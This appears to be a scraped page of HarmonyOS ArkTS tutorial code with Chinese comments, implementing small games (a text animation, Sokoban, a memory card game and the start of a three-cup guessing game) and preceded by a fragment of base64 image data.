JyN8NK3D+JUOd5Sn2bCnQkCP2fiwF5f/y+fTyj7zflA8KeFVABRa95Sm8Gpt2o0CyAqffdTpNE6BIlp8LUcCNAufeot5xQtONhWkoCigpMM/6JR3YS0JTyQRUgwI+FEiDBQlNH9allSigqMC8WvlwZEGeQtEEVIUCPhSYd1kfggWg8GFZWokCygq8G8fxVzQsSGgqy091KOBEgfDqiyhYkNB0YlWaiQL6Clz2P+3CAlDoq0+NKOBIgctRDA9hscx8yMIrNjw5si5NRQFFBeZ8hdS3BwtWaCqqTlUo4E2B9as6N2FBQtObWWkvCqgrcHVey11YkKdQF50KUcCjAldHR76CBSs0PdqUNqNAFgUu+Yq7OQsWXmURnUpRwJsCr46MvIosOjqZ25vhaC8KlFbg1en1t7CYSreI+6EACphU4GoIcjUMmaap5dcNmrQGjUIBowrcPbV+jiyY/TBqMpqFAnUUuPsCrQALooo6RuGuKGBOgfVCrHXjAizIVZgzGQ1CgSoKbL6Wc2QGpIpBuCkKmFRgK6qYE5wkNk3ajEahQA0FHr6OU2DBZrEaZuGeKGBPgVfTpVc5i2mafrIF3Z7VaBEKFFZg9yXfElkAi8JW4XYoYE2BR7mK0FaBBTMh1ixHe1CgrAKbMyAMQ8oagruhgGUF5lcTxjSQBGeMSpRBgXYVmN8JEtM9gcXXl4JPMYUpgwIo0JQCu0nN22EIsGjK/nQGBaIUiB5+rBOccnK3zIjwQQEU6EeB6OHHBRbyAwuz+vEQeooCL+uqDg0/bmHxeRgG2XnKBwVQoG0Fvo/j+DGli2HXKUORFPW4BgV8KXA4T3GV4Az/YfepL6vTWhRIUOBwnmILFhJdyFDkQ0IjuAQFUMC2AqdAIV27PbCX4Yhtg9M6FEhRIGo5917F914yRLJzTzX+jgJ+FHh62ST2rNHcrdcXslBLQ13qQIG6CiRNkW41mRcj1zUmd0eBXAqoguJVzuK21ewbyWVH6kWBrAqog2IXFlJgeVGyHL0nyU8+KIACthVQSWbe6+LmMGRdeAHGp5ffsTvVtqPQur4VOD09+ki+KFiEClbQkBmTvUjj13Kd7JUPP/8ehuH98nu5njUdfTs3vddRQJ4viSiizqVIveUhWNyJNgIw5HsAgiwpDT/vtmsBkEBDIAJAdhWjAApcKSDPmkQU0c9cqn7JsEi94d51CzykmABEhj5EH3ui8fdeFciSyNwS0xwsbhsKPHp9Duj3jgLZEpluYbEBDxmuSNTBsIVnqjcFig07boU1H1nsecIq58GQZU8s/u5dAbWl2ylCuIfFRtKVqCPFG7jGqgJFZjv2Ot8ULDaGLCRK97yAv1tVQCAhSUyVjWBnO9k0LO5EHWGKVtaJ8EEBywpUHXLcE6YbWGxEHSHPwfSs5cemr7aZGHIAiw2nu1kYRtTR18NppbdmIREE6jay2PKQBRwyJSsrSiXiIOqw8ji12Q6BxPM4jn9Z7x6w2LEQUYd1F3bbPjeQILJI8LHValJyHQn6ccmsgGz2ktWX2fdyaOtNZHFCUTbBnRCvr0vnKdBhGL55hASRRQZnBR4ZRPVdpal1EmelJLI4q+CD64FHRnHtVt1EFMHUaWUHAx6VDZDv9gEQP3IfQJOvC/s1E1nsa5StxAoeb5imzSZzroq7AMRaPGCRy5US6yX6SBSuzGXNDjFi5AMWMSpVLLNaJBYWinGGRzl7dBc9PJIWWJRzPLU73ZwextmlasrO58jKFGfTuYdUuYBFqnIGr9uIQiQS2TuJ3WBvsjdJwBBOngcOEXIDiwiRvBe5iUSkOyEa6QEkAoUABuk7YEh0aGCRKFxLl23ARLoYYGI9MglACN/l/TTySoqs79FoyQdi+gIsYlSiTHiNZVDiNiKRqd/1O2TWit0DzRZ8bvdLhIdf6lu/qGr+GRiUdcy/AeOQohjN6eIJAAAAAElFTkSuQmCC&#x27; // 初始化方法，在组件即将显示时被调用 aboutToAppear(): void &#123; for (let i = 0; i &lt; this.count; i++) &#123; this.list.push(new Cell()); // 初始化 Cell 数组 &#125; &#125; // 构建 UI 的方法 build() &#123; Column() &#123; // 创建一个垂直布局容器 Stack() &#123; // 创建一个堆栈布局容器 ForEach(this.list, (item: Cell, _index: number) =&gt; &#123; // 遍历 list 中的每一个 Cell Text(item.value)// 显示 Cell 中的文字 .fontColor(Color.White)// 设置文字颜色为白色 .fontSize(&#x27;50lpx&#x27;)// 设置文字大小 .translate(&#123; x: 0, y: `$&#123;item.y&#125;lpx` &#125;)// 设置文字的垂直偏移量 .opacity(item.opacity) // 设置文字的透明度 &#125;) &#125; .width(&#x27;300lpx&#x27;) // 设置堆栈布局容器的宽度 .height(&#x27;300lpx&#x27;) // 设置堆栈布局容器的高度 .align(Alignment.BottomEnd) // 设置对齐方式为底部右端 Image(this.image)// 显示图片 .width(&#x27;300lpx&#x27;)// 设置图片宽度 .height(&#x27;300lpx&#x27;)// 设置图片高度 .objectFit(ImageFit.Contain)// 图片适应容器 .clickEffect(&#123; // 点击效果配置 scale: 0.5, // 缩放比例 level: ClickEffectLevel.LIGHT // 效果级别 &#125;) .onClick(() =&gt; &#123; // 点击图片时触发的回调 let index = this.indexCount % this.count; // 计算当前滚动的索引 this.indexCount++; // 更新索引计数器 animateToImmediately(&#123; // 立即开始动画 duration: 0, // 动画持续时间为0毫秒 onFinish: () =&gt; &#123; // 动画完成后的回调 animateToImmediately(&#123; // 再次立即开始动画 duration: 1000, // 动画持续时间为1000毫秒 &#125;, () =&gt; &#123; this.list[index].y = -200 // 设置 Cell 的垂直偏移量 this.list[index].opacity = 0 // 设置 Cell 的透明度 &#125;) &#125; &#125;, () =&gt; &#123; this.list[index].y = 0 // 设置 Cell 的垂直偏移量 this.list[index].opacity = 1 // 设置 Cell 的透明度 &#125;) &#125;) &#125; .height(&#x27;100%&#x27;) // 设置容器高度为100% .width(&#x27;100%&#x27;) // 设置容器宽度为100% .backgroundColor(Color.Black) // 设置背景颜色为黑色 &#125;&#125; Sokoban推箱子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308 import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27; // 导入ArkUI工具包中的提示操作模块@ObservedV2 // 观察者模式装饰器class Cell &#123; // 定义游戏中的单元格类 @Trace // 跟踪装饰器，标记属性以被跟踪 type: number = 0; // 单元格类型，0：透明，1：墙，2：可移动区域 @Trace topLeft: number = 0; // 左上角圆角大小 @Trace topRight: number = 0; // 右上角圆角大小 @Trace bottomLeft: number = 0; // 左下角圆角大小 @Trace bottomRight: number = 0; // 右下角圆角大小 @Trace x: number = 0; // 单元格的X坐标偏移量 @Trace y: number = 0; // 单元格的Y坐标偏移量 constructor(cellType: number) &#123; // 构造函数 this.type = cellType; // 初始化单元格类型 &#125;&#125;@ObservedV2 // 观察者模式装饰器class MyPosition &#123; // 定义位置类 @Trace // 跟踪装饰器，标记属性以被跟踪 x: number = 0; // X坐标 @Trace y: number = 0; // Y坐标 setPosition(x: number, y: number) &#123; // 设置位置的方法 this.x = x; // 更新X坐标 this.y = y; // 更新Y坐标 &#125;&#125;@Entry // 入口装饰器@Component // 组件装饰器struct Sokoban &#123; // 定义游戏主结构 cellWidth: number = 100; // 单元格宽度 @State grid: Cell[][] = [ // 游戏网格状态 [new Cell(0), new Cell(1), new Cell(1), new Cell(1), new Cell(1), new Cell(1)], [new Cell(1), new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1), new Cell(1)], [new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(1), new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(0), new Cell(1), new Cell(1), new Cell(1), new Cell(1), new Cell(1)], ]; @State victoryPositions: MyPosition[] = [new MyPosition(), new MyPosition()]; // 胜利位置数组 @State cratePositions: MyPosition[] = [new MyPosition(), new MyPosition()]; // 箱子位置数组 playerPosition: MyPosition = new MyPosition(); // 玩家位置 @State screenStartX: number = 0; // 触摸开始时的屏幕X坐标 @State screenStartY: number = 0; // 触摸开始时的屏幕Y坐标 @State lastScreenX: number = 0; // 触摸结束时的屏幕X坐标 @State lastScreenY: number = 0; // 触摸结束时的屏幕Y坐标 @State startTime: number = 0; // 游戏开始时间 isAnimationRunning: boolean = false // 动画是否正在运行 aboutToAppear(): void &#123; // 游戏加载前的准备工作 // 初始化某些单元格的圆角大小... this.grid[0][1].topLeft = 25; this.grid[0][5].topRight = 25; this.grid[1][0].topLeft = 25; this.grid[4][0].bottomLeft = 25; this.grid[5][1].bottomLeft = 25; this.grid[5][5].bottomRight = 25; this.grid[1][1].bottomRight = 10; this.grid[4][1].topRight = 10; this.grid[2][4].topLeft = 10; this.grid[2][4].bottomLeft = 10; this.initializeGame(); // 初始化游戏 &#125; initializeGame() &#123; // 初始化游戏状态 this.startTime = Date.now(); // 设置游戏开始时间为当前时间 // 设置胜利位置和箱子位置... this.startTime = Date.now(); // 设置游戏开始时间为当前时间 this.victoryPositions[0].setPosition(1, 3); this.victoryPositions[1].setPosition(1, 4); this.cratePositions[0].setPosition(2, 2); this.cratePositions[1].setPosition(2, 3); this.playerPosition.setPosition(1, 2); &#125; isVictoryPositionVisible(x: number, y: number): boolean &#123; // 判断位置是否为胜利位置 return this.victoryPositions.some(position =&gt; position.x === x &amp;&amp; position.y === y); // 返回是否有胜利位置与给定位置匹配 &#125; isCratePositionVisible(x: number, y: number): boolean &#123; // 判断位置是否为箱子位置 return this.cratePositions.some(position =&gt; position.x === x &amp;&amp; position.y === y); // 返回是否有箱子位置与给定位置匹配 &#125; isPlayerPositionVisible(x: number, y: number): boolean &#123; // 判断位置是否为玩家位置 return this.playerPosition.x === x &amp;&amp; this.playerPosition.y === y; // 返回玩家位置是否与给定位置相同 &#125; movePlayer(direction: string) &#123; const directions: object = Object(&#123; &#x27;right&#x27;: Object(&#123; dx: 0, dy: 1&#125;), &#x27;left&#x27;: Object(&#123; dx:0 , dy:-1 &#125;), &#x27;down&#x27;: Object(&#123; dx: 1, dy: 0 &#125;), &#x27;up&#x27;: Object(&#123; dx: -1, dy: 0 &#125;) &#125;); const dx: number = directions[direction][&#x27;dx&#x27;]; //&#123; dx, dy &#125; const dy: number = directions[direction][&#x27;dy&#x27;]; //&#123; dx, dy &#125; const newX: number = this.playerPosition.x + dx; const newY: number = this.playerPosition.y + dy; const targetCell = this.grid[newX][newY]; // 检查新位置是否超出边界 if (!targetCell) &#123; return; &#125; // 如果新位置是墙，则不能移动 if (targetCell.type === 1) &#123; return; &#125; let crateIndex = -1; if (this.isCratePositionVisible(newX, newY)) &#123; const crateBehindCell = this.grid[newX + dx][newY + dy]; if (!crateBehindCell || crateBehindCell.type !== 2) &#123; return; &#125; crateIndex = this.cratePositions.findIndex(crate =&gt; crate.x === newX &amp;&amp; crate.y === newY); if (crateIndex === -1 || this.isCratePositionVisible(newX + dx, newY + dy)) &#123; return; &#125; &#125; if (this.isAnimationRunning) &#123; return &#125; this.isAnimationRunning = true animateToImmediately(&#123; duration: 150, onFinish: () =&gt; &#123; animateToImmediately(&#123; duration: 0, onFinish: () =&gt; &#123; this.isAnimationRunning = false &#125; &#125;, () =&gt; &#123; if (crateIndex !== -1) &#123; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].x = 0; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].y = 0; this.cratePositions[crateIndex].x += dx; this.cratePositions[crateIndex].y += dy; &#125; this.grid[this.playerPosition.x][this.playerPosition.y].x = 0 this.grid[this.playerPosition.x][this.playerPosition.y].y = 0 this.playerPosition.setPosition(newX, newY); // 检查是否获胜 const isAllCrateOnTarget = this.cratePositions.every(crate =&gt; &#123; return this.victoryPositions.some(victory =&gt; crate.x === victory.x &amp;&amp; crate.y === victory.y); &#125;); if (isAllCrateOnTarget) &#123; console.log(&quot;恭喜你，你赢了！&quot;); // 可以在这里添加胜利处理逻辑 promptAction.showDialog(&#123; // 显示对话框 title: &#x27;游戏胜利！&#x27;, // 对话框标题 message: &#x27;恭喜你，用时：&#x27; + ((Date.now() - this.startTime) / 1000).toFixed(3) + &#x27;秒&#x27;, // 对话框消息 buttons: [&#123; text: &#x27;重新开始&#x27;, color: &#x27;#ffa500&#x27; &#125;] // 对话框按钮 &#125;).then(() =&gt; &#123; // 对话框关闭后执行 this.initializeGame(); // 重新开始游戏 &#125;); &#125; &#125;) &#125; &#125;, () =&gt; &#123; this.grid[this.playerPosition.x][this.playerPosition.y].x = dy * this.cellWidth; this.grid[this.playerPosition.x][this.playerPosition.y].y = dx * this.cellWidth; if (crateIndex !== -1) &#123; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].x = dy * this.cellWidth; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].y = dx * this.cellWidth; &#125; console.info(`dx:$&#123;dx&#125;,dy:$&#123;dy&#125;`) &#125;) &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; //游戏区 Stack() &#123; //非零区加瓷砖 Column() &#123; ForEach(this.grid, (row: [], rowIndex: number) =&gt; &#123; Row() &#123; ForEach(row, (item: Cell, colIndex: number) =&gt; &#123; Stack() &#123; Text() .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .backgroundColor(item.type == 0 ? Color.Transparent : ((rowIndex + colIndex) % 2 == 0 ? &quot;#cfb381&quot; : &quot;#e1ca9f&quot;)) .borderRadius(&#123; topLeft: item.topLeft &gt; 10 ? item.topLeft : 0, topRight: item.topRight &gt; 10 ? item.topRight : 0, bottomLeft: item.bottomLeft &gt; 10 ? item.bottomLeft : 0, bottomRight: item.bottomRight &gt; 10 ? item.bottomRight : 0 &#125;) //如果和是胜利坐标，显示叉号 Stack() &#123; Text() .width(`$&#123;this.cellWidth / 2&#125;lpx`) .height(`$&#123;this.cellWidth / 8&#125;lpx`) .backgroundColor(Color.White) Text() .width(`$&#123;this.cellWidth / 8&#125;lpx`) .height(`$&#123;this.cellWidth / 2&#125;lpx`) .backgroundColor(Color.White) &#125;.rotate(&#123; angle: 45 &#125;) .visibility(this.isVictoryPositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) &#125; &#125;) &#125; &#125;) &#125; Column() &#123; ForEach(this.grid, (row: [], rowIndex: number) =&gt; &#123; Row() &#123; ForEach(row, (item: Cell, colIndex: number) =&gt; &#123; //是否显示箱子 Stack() &#123; Text() .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .backgroundColor(item.type == 1 ? &quot;#412c0f&quot; : Color.Transparent) .borderRadius(&#123; topLeft: item.topLeft, topRight: item.topRight, bottomLeft: item.bottomLeft, bottomRight: item.bottomRight &#125;) Text(&#x27;箱&#x27;) .fontColor(Color.White) .textAlign(TextAlign.Center) .fontSize(`$&#123;this.cellWidth / 2&#125;lpx`) .width(`$&#123;this.cellWidth - 5&#125;lpx`) .height(`$&#123;this.cellWidth - 5&#125;lpx`) .backgroundColor(&quot;#cb8321&quot;)//#995d12 #cb8321 .borderRadius(10) .visibility(this.isCratePositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) Text(&#x27;我&#x27;) .fontColor(Color.White) .textAlign(TextAlign.Center) .fontSize(`$&#123;this.cellWidth / 2&#125;lpx`) .width(`$&#123;this.cellWidth - 5&#125;lpx`) .height(`$&#123;this.cellWidth - 5&#125;lpx`) .backgroundColor(&quot;#007dfe&quot;)//#995d12 #cb8321 .borderRadius(10) .visibility(this.isPlayerPositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) &#125; .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .translate(&#123; x: `$&#123;item.x&#125;lpx`, y: `$&#123;item.y&#125;lpx` &#125;) &#125;) &#125; &#125;) &#125; &#125; Button(&#x27;重新开始&#x27;).clickEffect(&#123; level: ClickEffectLevel.MIDDLE &#125;) .onClick(() =&gt; &#123; this.initializeGame(); &#125;); &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .backgroundColor(&quot;#fdb300&quot;) .padding(&#123; top: 20 &#125;) .onTouch((e) =&gt; &#123; if (e.type === TouchType.Down &amp;&amp; e.touches.length &gt; 0) &#123; // 触摸开始，记录初始位置 this.screenStartX = e.touches[0].x; this.screenStartY = e.touches[0].y; &#125; else if (e.type === TouchType.Up &amp;&amp; e.changedTouches.length &gt; 0) &#123; // 当手指抬起时，更新最后的位置 this.lastScreenX = e.changedTouches[0].x; this.lastScreenY = e.changedTouches[0].y; &#125; &#125;) .gesture( SwipeGesture(&#123; direction: SwipeDirection.All &#125;)// 支持方向中 all可以是上下左右 .onAction((_event: GestureEvent) =&gt; &#123; const swipeX = this.lastScreenX - this.screenStartX; const swipeY = this.lastScreenY - this.screenStartY; // 清除开始位置记录，准备下一次滑动判断 this.screenStartX = 0; this.screenStartY = 0; if (Math.abs(swipeX) &gt; Math.abs(swipeY)) &#123; if (swipeX &gt; 0) &#123; // 向右滑动 this.movePlayer(&#x27;right&#x27;); &#125; else &#123; // 向左滑动 this.movePlayer(&#x27;left&#x27;); &#125; &#125; else &#123; if (swipeY &gt; 0) &#123; // 向下滑动 this.movePlayer(&#x27;down&#x27;); &#125; else &#123; // 向上滑动 this.movePlayer(&#x27;up&#x27;); &#125; &#125; &#125;) ) &#125;&#125; Memory Flip记忆翻转 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27; // 导入用于显示对话框的模块// 使用装饰器来观察数据变化@ObservedV2class GameCell &#123; // 定义单元格类 @Trace value: string; // 单元格的值，即卡片上的图案 @Trace isVisible: boolean = false; // 控制卡片是否可见 isFrontVisible: boolean = false; // 控制卡片是否正面朝上 isMatched: boolean = false; // 标记卡片是否已被匹配 isAnimationRunning: boolean = false; // 动画是否正在运行 @Trace rotationAngle: number = 0; // 卡片的旋转角度 constructor(value: string) &#123; // 构造函数，初始化单元格 this.value = value; // 设置单元格的值 &#125; // 展示卡片正面的方法 revealFace(animationTime: number, callback?: () =&gt; void) &#123; if (this.isAnimationRunning) &#123; // 如果已经有动画在运行，则返回 return; &#125; this.isAnimationRunning = true; // 设置动画状态为运行中 animateToImmediately(&#123; // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 animateToImmediately(&#123; // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 this.isFrontVisible = true; // 设置卡片为正面朝上 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.isVisible = true; // 设置卡片为可见 this.rotationAngle = 0; // 设置旋转角度为0 &#125;); &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.isVisible = false; // 设置卡片为不可见 this.rotationAngle = 90; // 设置旋转角度为90度 &#125;); &#125; // 重置卡片状态的方法 reset() &#123; this.isVisible = false; // 设置卡片为不可见 this.rotationAngle = 180; // 设置旋转角度为180度 this.isFrontVisible = false; // 设置卡片为背面朝上 this.isAnimationRunning = false; // 设置动画状态为停止 this.isMatched = false; // 设置卡片为未匹配 &#125; // 隐藏卡片正面的方法 hideFace(animationTime: number, callback?: () =&gt; void) &#123; if (this.isAnimationRunning) &#123; // 如果已经有动画在运行，则返回 return; &#125; this.isAnimationRunning = true; // 设置动画状态为运行中 animateToImmediately(&#123; // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 animateToImmediately(&#123; // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =&gt; &#123; // 动画完成后的回调 this.isFrontVisible = false; // 设置卡片为背面朝上 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) &#123; // 如果有回调函数，则执行 callback(); &#125; &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.isVisible = false; // 设置卡片为不可见 this.rotationAngle = 180; // 设置旋转角度为180度 &#125;); &#125; &#125;, () =&gt; &#123; // 动画开始时的回调 this.isVisible = true; // 设置卡片为可见 this.rotationAngle = 90; // 设置旋转角度为90度 &#125;); &#125;&#125;// 定义组件入口@Entry@Componentstruct MemoryGame &#123; // 定义游戏组件 @State gameCells: GameCell[] = []; // 存储游戏中的所有单元格 @State cellSize: number = 150; // 单元格的大小 @State cellSpacing: number = 5; // 单元格之间的间距 @State transitionDuration: number = 150; // 过渡动画的持续时间 @State firstSelectedIndex: number | null = null; // 记录第一次选择的卡片索引 @State secondSelectedIndex: number | null = null; // 记录第二次选择的卡片索引 @State isGameOver: boolean = false; // 游戏是否结束 @State startTime: number = 0; // 游戏开始时间 aboutToAppear(): void &#123; // 组件即将显示时触发 let cardValues: string[] = [&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;, &quot;F&quot;, &quot;G&quot;, &quot;H&quot;]; // 定义卡片的值 for (let value of cardValues) &#123; // 遍历卡片值 this.gameCells.push(new GameCell(value)); // 添加到游戏单元格数组中 this.gameCells.push(new GameCell(value)); // 每个值添加两次以形成对 &#125; this.shuffleCards(); // 洗牌 &#125; // 洗牌方法 shuffleCards() &#123; this.firstSelectedIndex = null; // 清除第一次选择索引 this.secondSelectedIndex = null; // 清除第二次选择索引 this.isGameOver = false; // 游戏未结束 this.startTime = Date.now(); // 设置游戏开始时间为当前时间 for (let i = 0; i &lt; 16; i++) &#123; // 重置所有单元格状态 this.gameCells[i].reset(); &#125; for (let i = this.gameCells.length - 1; i &gt; 0; i--) &#123; // 洗牌算法 const randomIndex = Math.floor(Math.random() * (i + 1)); // 随机索引 let tempValue = this.gameCells[i].value; // 临时保存值 this.gameCells[i].value = this.gameCells[randomIndex].value; // 交换值 this.gameCells[randomIndex].value = tempValue; // 交换值 &#125; &#125; // 检查卡片是否匹配的方法 checkForMatch() &#123; if (this.firstSelectedIndex !== null &amp;&amp; this.secondSelectedIndex !== null) &#123; // 确保两个索引都不为空 const firstCell = this.gameCells[this.firstSelectedIndex]; // 获取第一个选中的单元格 const secondCell = this.gameCells[this.secondSelectedIndex]; // 获取第二个选中的单元格 if (firstCell.value === secondCell.value) &#123; // 如果两个单元格的值相同 firstCell.isMatched = true; // 标记为已匹配 secondCell.isMatched = true; // 标记为已匹配 this.firstSelectedIndex = null; // 清除第一次选择索引 this.secondSelectedIndex = null; // 清除第二次选择索引 if (this.gameCells.every(cell =&gt; cell.isMatched)) &#123; // 如果所有单元格都已匹配 this.isGameOver = true; // 游戏结束 console.info(&quot;游戏结束&quot;); // 打印信息 promptAction.showDialog(&#123; // 显示对话框 title: &#x27;游戏胜利！&#x27;, // 对话框标题 message: &#x27;恭喜你，用时：&#x27; + ((Date.now() - this.startTime) / 1000).toFixed(3) + &#x27;秒&#x27;, // 对话框消息 buttons: [&#123; text: &#x27;重新开始&#x27;, color: &#x27;#ffa500&#x27; &#125;] // 对话框按钮 &#125;).then(() =&gt; &#123; // 对话框关闭后执行 this.shuffleCards(); // 重新开始游戏 &#125;); &#125; &#125; else &#123; // 如果两个单元格的值不同 setTimeout(() =&gt; &#123; // 延迟一段时间后 if (this.firstSelectedIndex !== null) &#123; // 如果第一个索引不为空 this.gameCells[this.firstSelectedIndex].hideFace(this.transitionDuration, () =&gt; &#123; // 隐藏卡片 this.firstSelectedIndex = null; // 清除第一次选择索引 &#125;); &#125; if (this.secondSelectedIndex !== null) &#123; // 如果第二个索引不为空 this.gameCells[this.secondSelectedIndex].hideFace(this.transitionDuration, () =&gt; &#123; // 隐藏卡片 this.secondSelectedIndex = null; // 清除第二次选择索引 &#125;); &#125; &#125;, 400); // 延迟时间 &#125; &#125; &#125; // 构建游戏界面的方法 build() &#123; Column(&#123; space: 20 &#125;) &#123; // 创建一个垂直布局 Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // 创建一个可换行的弹性布局 ForEach(this.gameCells, (gameCell: GameCell, index: number) =&gt; &#123; // 遍历游戏单元格 Text(`$&#123;gameCell.isVisible ? gameCell.value : &#x27;&#x27;&#125;`) // 显示单元格的值或空字符串 .width(`$&#123;this.cellSize&#125;lpx`) // 设置宽度 .height(`$&#123;this.cellSize&#125;lpx`) // 设置高度 .margin(`$&#123;this.cellSpacing&#125;lpx`) // 设置边距 .fontSize(`$&#123;this.cellSize / 2&#125;lpx`) // 设置字体大小 .textAlign(TextAlign.Center) // 文本居中 .backgroundColor(gameCell.isVisible ? Color.Orange : Color.Gray) // 设置背景颜色 .fontColor(Color.White) // 设置字体颜色 .borderRadius(5) // 设置圆角 .rotate(&#123; // 设置旋转 x: 0, y: 1, z: 0, angle: gameCell.rotationAngle, // 旋转角度 centerX: `$&#123;this.cellSize / 2&#125;lpx`, // 中心点X坐标 centerY: `$&#123;this.cellSize / 2&#125;lpx`, // 中心点Y坐标 &#125;) .onClick(() =&gt; &#123; // 单击事件处理 if (this.isGameOver) &#123; // 如果游戏已结束 console.info(&quot;游戏已结束&quot;); // 打印信息 return; &#125; if (gameCell.isMatched) &#123; // 如果单元格已匹配 console.info(&quot;当前已标记&quot;); // 打印信息 return; &#125; if (this.firstSelectedIndex == null) &#123; // 如果没有第一次选择 this.firstSelectedIndex = index; // 设置第一次选择索引 if (!gameCell.isFrontVisible) &#123; // 如果不是正面朝上 gameCell.revealFace(this.transitionDuration); // 展示正面 &#125; &#125; else if (this.firstSelectedIndex == index) &#123; // 如果与第一次选择相同 console.info(&quot;和上一次点击的是一样的，不予处理&quot;); // 打印信息 &#125; else if (this.secondSelectedIndex == null) &#123; // 如果没有第二次选择 this.secondSelectedIndex = index; // 设置第二次选择索引 if (!gameCell.isFrontVisible) &#123; // 如果不是正面朝上 gameCell.revealFace(this.transitionDuration, () =&gt; &#123; // 展示正面 this.checkForMatch(); // 检查是否匹配 &#125;); &#125; &#125; &#125;); &#125;); &#125;.width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 4&#125;lpx`); // 设置宽度 Button(&#x27;重新开始&#x27;) // 创建“重新开始”按钮 .onClick(() =&gt; &#123; // 按钮点击事件 this.shuffleCards(); // 重新开始游戏 &#125;); &#125;.height(&#x27;100%&#x27;).width(&#x27;100%&#x27;); // 设置高度和宽度 &#125;&#125; 3cup ball三杯猜球 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182// 使用装饰器来追踪对象的变化@ObservedV2class Cup &#123; // 使用装饰器来追踪属性的变化 @Trace positionX: number; // 杯子的X轴位置 @Trace positionY: number; // 杯子的Y轴位置 @Trace containsBall: boolean; // 杯子内是否有球 @Trace isRevealed: boolean; // 杯子是否打开 // 构造函数初始化杯子的状态 constructor(hasBall: boolean) &#123; this.positionX = 0; this.positionY = 0; this.containsBall = hasBall; this.isRevealed = true; &#125;&#125; // 游戏入口组件@Entry@Componentstruct ThreeCupGame &#123; // 游戏状态变量 @State gameCups: Cup[] = [// 初始化三个杯子，其中一个有球 new Cup(true), new Cup(false), new Cup(false) ]; @State cupWidth: number = 200; // 杯子宽度 @State cupSpacing: number = 10; // 杯子之间的间距 @State animationDurationMs: number = 140; // 动画持续时间（毫秒） @State isGameAnimating: boolean = false; // 是否正在动画中 @State mixingCount: number = 5; // 每局游戏混合次数 @State currentMixingCount: number = 0; // 当前正在进行的混合次数计数 // 开始游戏的方法 startGame() &#123; this.currentMixingCount--; // 减少混合次数 const cupPairs = [[0, 1], [0, 2], [1, 2]]; // 可能的杯子对组合 const selectedPair = cupPairs[Math.floor(Math.random() * cupPairs.length)]; // 随机选择一对 this.moveCups(selectedPair[0], selectedPair[1]); // 开始移动选定的两个杯子 &#125; // 移动指定的两个杯子 moveCups(cupIndex1: number, cupIndex2: number) &#123; const direction: number = Math.random() &lt; 0.5 ? -1 : 1; // 随机方向 const distanceFactor: number = Math.abs(cupIndex1 - cupIndex2); // 距离因子 const adjustedDistanceFactor: number = distanceFactor === 1 ? 2 : 1; // 根据距离调整因子 animateToImmediately(&#123; delay: 0, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex1].positionY = -direction * (this.cupWidth + this.cupSpacing * 2) / adjustedDistanceFactor &#125;) animateToImmediately(&#123; delay: this.animationDurationMs, duration: this.animationDurationMs &#125;, () =&gt; &#123; this.gameCups[cupIndex1].positionX = (this.cupWidth + this.cupSpacing * 2) * distanceFactor this.gameCups[cupIndex1].positionY = -direction * (this.cupWidth + this.cupSpacing * 2) / 